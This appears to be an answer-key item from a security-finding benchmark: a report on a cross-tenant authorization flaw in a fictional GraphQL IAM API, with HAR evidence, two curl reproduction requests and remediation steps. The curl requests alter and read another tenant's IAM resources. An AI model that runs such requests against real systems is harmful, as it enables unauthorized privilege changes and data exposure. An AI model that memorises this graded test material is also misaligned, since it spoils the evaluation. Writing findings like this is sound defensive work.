# Expected Response

## System
- Domain: Cloud IAM / Identity & Access Management
- System: VaultGuard IAM API
- Example ID: GQL-0094

## Priority Findings

### Finding 1: IAM Nested Resource Access Without Parent Authorization — Cross-Tenant Identity Data Exposure (Pattern 1.7)
**Severity:** Critical
**Category:** BOLA / Nested Resources / IAM

**Summary:**
Per §5.0 (Pattern 1.7 — nested resources without parent authorization): An attacker from `tenant-3954` modified IAM resource `R-2094` (belonging to `tenant-8edb`) via `updateResource`, injecting `ownerId: "attacker-39548edb"`. In a Cloud IAM platform, this is especially severe — unauthorized write to an IAM resource can escalate privileges, create rogue identity bindings, or disable security controls. Nested IAM resources (role bindings, policy attachments) accessible via `getResourceWithChildren` are also not re-validated at each level.

**Evidence from HAR:**
- Request: `POST https://api.vaultguard-iam-api.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-3954`
- Mutation: `updateResource(id: "R-2094", input: {status: "approved", ownerId: "attacker-39548edb"}) { resourceId status }`
- Response `200 OK`; `tenantId: "tenant-8edb"`, `sensitiveField: "CONFIDENTIAL-39548edb"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-39548edb`

## Steps to Reproduce

### Step 1 — Cross-tenant IAM resource mutation (HAR)
```bash
curl -s -X POST https://api.vaultguard-iam-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-3954" \
  -d '{"query": "mutation { updateResource(id: \"R-2094\", input: {status: \"approved\", ownerId: \"attacker-39548edb\"}) { resourceId status } }"}'
```
**Vulnerable:** IAM resource mutated across tenant; identity binding potentially altered. **Secure:** FORBIDDEN.

### Step 2 — Nested IAM policy/role traversal
```bash
curl -s -X POST https://api.vaultguard-iam-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-3954" \
  -d '{"query": "query { getResourceWithChildren(id: \"R-2094\") { resourceId tenantId items { resourceId tenantId data { sensitiveField } } } }"}'
```
**Vulnerable:** Nested IAM child resources (role bindings, policies) from `tenant-8edb` exposed.

## Remediation
1. Resolver tenant guard on all IAM mutations: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Strip `ownerId` from `ResourceInput`.
3. Re-validate authorization at each nested IAM resource level.
4. IAM mutations require additional MFA/approval workflow.
5. Redis cache key: `resource:{tenantId}:{resourceId}`.
